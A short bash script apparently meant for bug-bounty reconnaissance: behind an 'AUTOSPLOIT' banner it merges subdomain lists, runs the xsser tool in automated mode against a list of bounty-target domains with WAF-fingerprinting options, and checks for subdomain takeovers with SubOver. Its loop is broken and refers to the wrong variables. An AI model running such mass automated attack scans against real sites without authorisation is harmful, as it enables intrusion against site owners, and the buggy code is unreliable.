#!/bin/bash

clear

echo -e "\e[1m"
echo -e "\e[94m"
echo -e """

 ________   __  __   _________  ______   ______   ______   __       ______    ________  _________  
/_______/\ /_/\/_/\ /________/\/_____/\ /_____/\ /_____/\ /_/\     /_____/\  /_______/\/________/\ 
\::: _  \ \\:\ \:\ \\__.::.__\/\:::_ \ \\::::_\/_\:::_ \ \\:\ \    \:::_ \ \ \__.::._\/\__.::.__\/ 
 \::(_)  \ \\:\ \:\ \  \::\ \   \:\ \ \ \\:\/___/\\:(_) \ \\:\ \    \:\ \ \ \   \::\ \    \::\ \   
  \:: __  \ \\:\ \:\ \  \::\ \   \:\ \ \ \\_::._\:\\: ___\/ \:\ \____\:\ \ \ \  _\::\ \__  \::\ \  
   \:.\ \  \ \\:\_\:\ \  \::\ \   \:\_\ \ \ /____\:\\ \ \    \:\/___/\\:\_\ \ \/__\::\__/\  \::\ \ 
    \__\/\__\/ \_____\/   \__\/    \_____\/ \_____\/ \_\/     \_____\/ \_____\/\________\/   \__\/ 
                                                                                                   

"""


cat *.out > all_subdomains.lst; 

echo -e "\e[1m"
echo -e "\e[3m\e[91m Appending https:// to each subdomain.."
echo -e "\e[0m"
while read $file;
do 
	echo "https://"$h >> subdomins.txt 
done < all_subdomains.lst;


xsser -i /root/xsskiller/bounty-targets-data/data/domains.txt --auto --Str --Coo --Xsa --Xsr --Ind --Anchor --Dcp --Dom -c 100 --Cw=50 --delay=1 --save  --Phpids0.6.5  --Phpids0.7 --Imperva --Webknight --F5bigip --Barracuda --Modsec --Quickdefense --heuristic --threads=10 --silent
echo -e "\e[1m"
echo -e "\e[93m[+] Running XSS on all <domains>, Yeet!! "
echo -e "\e[0m"
	
echo -e "\e[34m\e[5m\e[1mPlease Wait.."
echo -e "\e[0m"
xsser -i /root/xsskiller/bounty-targets-data/data/domains.txt --auto --Str --Coo --Xsa --Xsr --Ind --Anchor --Dcp --Dom -c 100 --Cw=50 --delay=1 --save  --Phpids0.6.5  --Phpids0.7 --Imperva --Webknight --F5bigip --Barracuda --Modsec --Quickdefense --heuristic --threads=10 --silent
echo -e "\e[1m"
echo -e "\e[93m"
cat *.raw >> report.raw
cat report.raw
echo -e "\e[0m"

echo -e "\e[1m"
echo -e "\e[3m\e[93m[+] Finding Subdomain takeovers.."
cd /root/go/src/github.com/Ice3man543/SubOver
go run subover.go -l /root/subkiller/all_subdomains.lst -timeout 5 -o subover.out;
echo -e "\e[1m"
echo -e "\e[93m"
cat subover.out

